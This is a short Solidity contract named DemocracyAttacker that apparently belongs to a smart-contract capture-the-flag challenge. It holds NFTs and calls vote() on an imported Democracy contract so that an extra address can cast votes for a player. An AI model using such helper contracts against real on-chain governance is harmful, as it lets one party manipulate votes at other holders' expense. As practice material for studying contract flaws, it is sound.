// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./Democracy.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract DemocracyAttacker is IERC721Receiver {
    Democracy target;
    address public player;

    constructor(address _target, address _player) {
        target = Democracy(_target);
        player = _player;
    }

    function attack() external {
        target.vote(player);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
